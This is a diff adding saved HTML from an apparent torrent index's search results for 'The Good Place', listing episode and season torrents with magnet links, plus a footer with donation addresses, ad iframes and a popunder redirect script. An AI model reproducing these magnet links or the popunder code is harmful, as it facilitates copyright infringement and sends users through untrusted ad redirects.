+		<td align="right">43</td>
+		<td align="right">4</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/28367682/The.Good.Place.S03.Season.3.Complete.720p" class="detLink" title="Details for The.Good.Place.S03.Season.3.Complete.720p">The.Good.Place.S03.Season.3.Complete.720p</a>
+</div>
+<a href="magnet:?xt=urn:btih:14f6ce157fd407ca85a79452617034346a4ed059&dn=The.Good.Place.S03.Season.3.Complete.720p&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><img src="//thepiratebay.org/static/img/icon_comment.gif" alt="This torrent has 2 comments." title="This torrent has 2 comments." /><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 01-10&nbsp;05:16, Size 5.11&nbsp;GiB, ULed by <a class="detDesc" href="/user/Gnolly/" title="Browse Gnolly">Gnolly</a></font>
+		</td>
+		<td align="right">39</td>
+		<td align="right">7</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/34740271/The.Good.Place.S04E01.1080p.HDTV.x264-LucidTV[TGx]" class="detLink" title="Details for The.Good.Place.S04E01.1080p.HDTV.x264-LucidTV[TGx]">The.Good.Place.S04E01.1080p.HDTV.x264-LucidTV[TGx]</a>
+</div>
+<a href="magnet:?xt=urn:btih:8b045a2aa825e75cd6a3ba988deb0d701ae8d76c&dn=The.Good.Place.S04E01.1080p.HDTV.x264-LucidTV%5BTGx%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/34740271/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/sotnikam"><img src="//thepiratebay.org/static/img/trusted.png" alt="Trusted" title="Trusted" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 09-27&nbsp;08:23, Size 1.5&nbsp;GiB, ULed by <a class="detDesc" href="/user/sotnikam/" title="Browse sotnikam">sotnikam</a></font>
+		</td>
+		<td align="right">37</td>
+		<td align="right">12</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/24818297/The_Good_Place_-_Season_1_and_2_-_Mp4_x264_AC3_1080p" class="detLink" title="Details for The Good Place - Season 1 and 2 - Mp4 x264 AC3 1080p">The Good Place - Season 1 and 2 - Mp4 x264 AC3 1080p</a>
+</div>
+<a href="magnet:?xt=urn:btih:bd06f982fc19ad2aa598c909974a5bb7ffae91dc&dn=The+Good+Place+-+Season+1+and+2+-+Mp4+x264+AC3+1080p&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/24818297/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/Truth4U"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 09-10&nbsp;2018, Size 16.64&nbsp;GiB, ULed by <a class="detDesc" href="/user/Truth4U/" title="Browse Truth4U">Truth4U</a></font>
+		</td>
+		<td align="right">27</td>
+		<td align="right">21</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/34951857/The.Good.Place.S04E06.720p.HDTV.x264-AVS[TGx]" class="detLink" title="Details for The.Good.Place.S04E06.720p.HDTV.x264-AVS[TGx]">The.Good.Place.S04E06.720p.HDTV.x264-AVS[TGx]</a>
+</div>
+<a href="magnet:?xt=urn:btih:0ee4ea7c9465d73f83de0a2cfe411912cd1b561e&dn=The.Good.Place.S04E06.720p.HDTV.x264-AVS%5BTGx%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/34951857/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/sotnikam"><img src="//thepiratebay.org/static/img/trusted.png" alt="Trusted" title="Trusted" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 11-01&nbsp;02:32, Size 558.16&nbsp;MiB, ULed by <a class="detDesc" href="/user/sotnikam/" title="Browse sotnikam">sotnikam</a></font>
+		</td>
+		<td align="right">25</td>
+		<td align="right">9</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/34795305/The.Good.Place.S04E02.1080p.HDTV.x264-LucidTV[TGx]" class="detLink" title="Details for The.Good.Place.S04E02.1080p.HDTV.x264-LucidTV[TGx]">The.Good.Place.S04E02.1080p.HDTV.x264-LucidTV[TGx]</a>
+</div>
+<a href="magnet:?xt=urn:btih:14dfa45c257fc4880f81ea991ef81d04d60a140a&dn=The.Good.Place.S04E02.1080p.HDTV.x264-LucidTV%5BTGx%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/34795305/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/sotnikam"><img src="//thepiratebay.org/static/img/trusted.png" alt="Trusted" title="Trusted" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 10-04&nbsp;04:18, Size 1.48&nbsp;GiB, ULed by <a class="detDesc" href="/user/sotnikam/" title="Browse sotnikam">sotnikam</a></font>
+		</td>
+		<td align="right">24</td>
+		<td align="right">7</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/34970488/The.Good.Place.S04E07.720p.HDTV.x264-AVS[TGx]" class="detLink" title="Details for The.Good.Place.S04E07.720p.HDTV.x264-AVS[TGx]">The.Good.Place.S04E07.720p.HDTV.x264-AVS[TGx]</a>
+</div>
+<a href="magnet:?xt=urn:btih:a2b44e6a1da6285051374db1eea0f94ce8fa464b&dn=The.Good.Place.S04E07.720p.HDTV.x264-AVS%5BTGx%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/34970488/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/sotnikam"><img src="//thepiratebay.org/static/img/trusted.png" alt="Trusted" title="Trusted" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 11-08&nbsp;03:32, Size 498.88&nbsp;MiB, ULed by <a class="detDesc" href="/user/sotnikam/" title="Browse sotnikam">sotnikam</a></font>
+		</td>
+		<td align="right">24</td>
+		<td align="right">7</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/35047745/The.Good.Place.S04E09.HDTV.x264-SVA[TGx]" class="detLink" title="Details for The.Good.Place.S04E09.HDTV.x264-SVA[TGx]">The.Good.Place.S04E09.HDTV.x264-SVA[TGx]</a>
+</div>
+<a href="magnet:?xt=urn:btih:2d250404d97dcc254345f3228e25a77ecac559e4&dn=The.Good.Place.S04E09.HDTV.x264-SVA%5BTGx%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/35047745/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/sotnikam"><img src="//thepiratebay.org/static/img/trusted.png" alt="Trusted" title="Trusted" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 11-22&nbsp;03:30, Size 134.97&nbsp;MiB, ULed by <a class="detDesc" href="/user/sotnikam/" title="Browse sotnikam">sotnikam</a></font>
+		</td>
+		<td align="right">24</td>
+		<td align="right">2</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/28954387/The.Good.Place.S03E12.1080p.WEB.x264-TBS[TGx]" class="detLink" title="Details for The.Good.Place.S03E12.1080p.WEB.x264-TBS[TGx]">The.Good.Place.S03E12.1080p.WEB.x264-TBS[TGx]</a>
+</div>
+<a href="magnet:?xt=urn:btih:2ac816bc9605c58389106d58e6ebffcdfc6bbd85&dn=The.Good.Place.S03E12.1080p.WEB.x264-TBS%5BTGx%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/28954387/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><img src="//thepiratebay.org/static/img/icon_comment.gif" alt="This torrent has 1 comments." title="This torrent has 1 comments." /><a href="/user/sotnikam"><img src="//thepiratebay.org/static/img/trusted.png" alt="Trusted" title="Trusted" style="width:11px;" border='0' /></a>
+			<font class="detDesc">Uploaded 01-25&nbsp;11:11, Size 663.21&nbsp;MiB, ULed by <a class="detDesc" href="/user/sotnikam/" title="Browse sotnikam">sotnikam</a></font>
+		</td>
+		<td align="right">20</td>
+		<td align="right">7</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/35047746/The.Good.Place.S04E09.720p.HDTV.x264-AVS[TGx]" class="detLink" title="Details for The.Good.Place.S04E09.720p.HDTV.x264-AVS[TGx]">The.Good.Place.S04E09.720p.HDTV.x264-AVS[TGx]</a>
+</div>
+<a href="magnet:?xt=urn:btih:c5bc87931cad9ab7d85493eac9c6d0b8c36d9707&dn=The.Good.Place.S04E09.720p.HDTV.x264-AVS%5BTGx%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/35047746/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/sotnikam"><img src="//thepiratebay.org/static/img/trusted.png" alt="Trusted" title="Trusted" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 11-22&nbsp;03:31, Size 476.73&nbsp;MiB, ULed by <a class="detDesc" href="/user/sotnikam/" title="Browse sotnikam">sotnikam</a></font>
+		</td>
+		<td align="right">20</td>
+		<td align="right">4</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/21572914/The_Good_Place_Season_2_1080p_x264" class="detLink" title="Details for The Good Place Season 2 1080p x264">The Good Place Season 2 1080p x264</a>
+</div>
+<a href="magnet:?xt=urn:btih:c072aedaa7158736d3438a06254612474cc5e19e&dn=The+Good+Place+Season+2+1080p+x264&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/21572914/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><img src="//thepiratebay.org/static/img/11x11p.png" /><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 05-02&nbsp;2018, Size 3.43&nbsp;GiB, ULed by <a class="detDesc" href="/user/coma-toes/" title="Browse coma-toes">coma-toes</a></font>
+		</td>
+		<td align="right">19</td>
+		<td align="right">7</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/28558338/The.Good.Place.S03E11.REAL.HDTV.x264-BATV[ettv]" class="detLink" title="Details for The.Good.Place.S03E11.REAL.HDTV.x264-BATV[ettv]">The.Good.Place.S03E11.REAL.HDTV.x264-BATV[ettv]</a>
+</div>
+<a href="magnet:?xt=urn:btih:69ab51b5d574613746cd8565c15dfa696e0d39f4&dn=The.Good.Place.S03E11.REAL.HDTV.x264-BATV%5Bettv%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/28558338/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/ettv"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 01-18&nbsp;04:23, Size 166.97&nbsp;MiB, ULed by <a class="detDesc" href="/user/ettv/" title="Browse ettv">ettv</a></font>
+		</td>
+		<td align="right">19</td>
+		<td align="right">2</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/34654316/The.Good.Place.S04E00.The.Selection.1080p.WEB.x264" class="detLink" title="Details for The.Good.Place.S04E00.The.Selection.1080p.WEB.x264">The.Good.Place.S04E00.The.Selection.1080p.WEB.x264</a>
+</div>
+<a href="magnet:?xt=urn:btih:ab19126781a48f6c9c1199dd225d22a6f71ce3f5&dn=The.Good.Place.S04E00.The.Selection.1080p.WEB.x264&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/34654316/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><img src="//thepiratebay.org/static/img/11x11p.png" /><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 09-19&nbsp;23:15, Size 403.78&nbsp;MiB, ULed by <a class="detDesc" href="/user/mwoz/" title="Browse mwoz">mwoz</a></font>
+		</td>
+		<td align="right">19</td>
+		<td align="right">0</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/34971413/The.Good.Place.S04E07.1080p.WEB.X264-METCON[TGx]" class="detLink" title="Details for The.Good.Place.S04E07.1080p.WEB.X264-METCON[TGx]">The.Good.Place.S04E07.1080p.WEB.X264-METCON[TGx]</a>
+</div>
+<a href="magnet:?xt=urn:btih:b2e3d2bd6dbdb680818e35c6b4314c2a1e8767f4&dn=The.Good.Place.S04E07.1080p.WEB.X264-METCON%5BTGx%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/34971413/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/sotnikam"><img src="//thepiratebay.org/static/img/trusted.png" alt="Trusted" title="Trusted" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 11-08&nbsp;09:16, Size 1.06&nbsp;GiB, ULed by <a class="detDesc" href="/user/sotnikam/" title="Browse sotnikam">sotnikam</a></font>
+		</td>
+		<td align="right">18</td>
+		<td align="right">2</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/25165918/The.Good.Place.S03E01-E02.HDTV.x264-SVA[ettv]" class="detLink" title="Details for The.Good.Place.S03E01-E02.HDTV.x264-SVA[ettv]">The.Good.Place.S03E01-E02.HDTV.x264-SVA[ettv]</a>
+</div>
+<a href="magnet:?xt=urn:btih:a381281680c9f3846ddc940181eb0a71e7c36916&dn=The.Good.Place.S03E01-E02.HDTV.x264-SVA%5Bettv%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/25165918/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/ettv"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 09-28&nbsp;2018, Size 313.93&nbsp;MiB, ULed by <a class="detDesc" href="/user/ettv/" title="Browse ettv">ettv</a></font>
+		</td>
+		<td align="right">17</td>
+		<td align="right">5</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/29278671/The_Good_Place_Season_3._revittony" class="detLink" title="Details for The Good Place Season 3. revittony">The Good Place Season 3. revittony</a>
+</div>
+<a href="magnet:?xt=urn:btih:832333c233fbb5a6281cf064b5aaaf4303459318&dn=The+Good+Place+Season+3.+revittony&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/29278671/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/revittony1"><img src="//thepiratebay.org/static/img/trusted.png" alt="Trusted" title="Trusted" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 01-31&nbsp;12:17, Size 1.99&nbsp;GiB, ULed by <a class="detDesc" href="/user/revittony1/" title="Browse revittony1">revittony1</a></font>
+		</td>
+		<td align="right">17</td>
+		<td align="right">5</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/35002107/The.Good.Place.S04E08.720p.HDTV.x265-MiNX[TGx]" class="detLink" title="Details for The.Good.Place.S04E08.720p.HDTV.x265-MiNX[TGx]">The.Good.Place.S04E08.720p.HDTV.x265-MiNX[TGx]</a>
+</div>
+<a href="magnet:?xt=urn:btih:444edae6a4cd3134d283834f31487a7c9688f910&dn=The.Good.Place.S04E08.720p.HDTV.x265-MiNX%5BTGx%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/35002107/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/sotnikam"><img src="//thepiratebay.org/static/img/trusted.png" alt="Trusted" title="Trusted" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 11-15&nbsp;04:56, Size 129.64&nbsp;MiB, ULed by <a class="detDesc" href="/user/sotnikam/" title="Browse sotnikam">sotnikam</a></font>
+		</td>
+		<td align="right">17</td>
+		<td align="right">1</td>
+	</tr>
+
+</table>
+</div>
+<div align="center">1&nbsp;<a href="/search/the good place/1/7//">2</a>&nbsp;<a href="/search/the good place/2/7//">3</a>&nbsp;<a href="/search/the good place/3/7//">4</a>&nbsp;<a href="/search/the good place/4/7//">5</a>&nbsp;<a href="/search/the good place/5/7//">6</a>&nbsp;<a href="/search/the good place/6/7//">7</a>&nbsp;<a href="/search/the good place/7/7//">8</a>&nbsp;<a href="/search/the good place/8/7//">9</a>&nbsp;<a href="/search/the good place/9/7//">10</a>&nbsp;<a href="/search/the good place/10/7//">11</a>&nbsp;<a href="/search/the good place/11/7//">12</a>&nbsp;<a href="/search/the good place/12/7//">13</a>&nbsp;<a href="/search/the good place/13/7//">14</a>&nbsp;<a href="/search/the good place/14/7//">15</a>&nbsp;<a href="/search/the good place/15/7//">16</a>&nbsp;<a href="/search/the good place/16/7//">17</a>&nbsp;<a href="/search/the good place/17/7//">18</a>&nbsp;<a href="/search/the good place/18/7//">19</a>&nbsp;<a href="/search/the good place/19/7//">20</a>&nbsp;<a href="/search/the good place/20/7//">21</a>&nbsp;<a href="/search/the good place/1/7//"><img src="//thepiratebay.org/static/img/next.gif" border="0" alt="Next"/></a>&nbsp;
+</div>
+			<div class="ads" id="sky-banner">
+				 <iframe src="//thepiratebay.org/static/si0Eim0u/exo_na/sky1.html" width="120" height="600" frameborder="0" scrolling="no"></iframe>
+			</div>
+			<script type="text/javascript" src="//thepiratebay.org/static/si0Eim0u/ad-scroll.js"></script>
+	</div></div>	</div><!-- //div:content -->
+
+	<div id="foot" style="text-align:center;margin-top:1em;">
+
+			 <iframe src="//thepiratebay.org/static/si0Eim0u/exo_na/bottom.html" width="728" height="90" frameborder="0" scrolling="no"></iframe>
+				<p>
+			<a href="/login" title="Login">Login</a> | 
+			<a href="/register" title="Register">Register</a> | 
+			<a href="/language" title="Select language">Language / Select language</a> |
+			<a href="/about" title="About">About</a> |
+			<a href="/blog" title="Blog">Blog</a>
+			<br />
+			<!--<a href="/contact" title="Contact us">Contact us</a> |-->
+			<a href="/policy" title="Usage policy">Usage policy</a> |
+                        <a href="http://piratebayztemzmv.onion" title="TOR">TOR</a> |
+			<a href="/doodles" title="Doodles">Doodles</a> |
+			<a href="http://pirates-forum.org/" title="Forum" target="_blank">Forum</a> 
+ | <a href="https://www.azirevpn.com/aff/5jxhwlzw" target='_NEW'><b>VPN</b></a>
+ | <a href="https://tmp.ninja" target='_NEW'><b>FileHosting</b></a>
+
+			<br />
+		</p>
+
+<br /><a href="http://bitcoin.org" target="_NEW">BTC</a>: <b>3HcEB6bi4TFPdvk31Pwz77DwAzfAZz2fMn</b><br /><a href="http://bitcoin.org" target="_NEW">BTC (Bech32)</a>: <b>bc1q9x30z7rz52c97jwc2j79w76y7l3ny54nlvd4ew</b><br /><a href="http://litecoin.org" target="_NEW">LTC</a>: <b>LS78aoGtfuGCZ777x3Hmr6tcoW3WaYynx9</b><br /><a href="http://getmonero.org" target="_NEW">XMR</a>: <b>46E5ekYrZd5UCcmNuYEX24FRjWVMgZ1ob79cRViyfvLFZjfyMhPDvbuCe54FqLQvVCgRKP4UUMMW5fy3ZhVQhD1JLLufBtu</b>
+
+		<div id="fbanners">
+			<a href="/rss" class="rss" title="RSS"><img src="//thepiratebay.org/static/img/rss_small.gif" alt="RSS" /></a>
+		</div><!-- // div:fbanners -->
+	</div><!-- // div:foot -->
+
+<script>
+var _wm_settings = {
+  popunder: {
+    url: 			'https://traffic.adexprtz.com/?placement=289748&redirect',
+    times: 		2,
+    hours: 		12.000000,
+    cookie: 	'tpbpop',
+    fastbind:true
+  }
+};
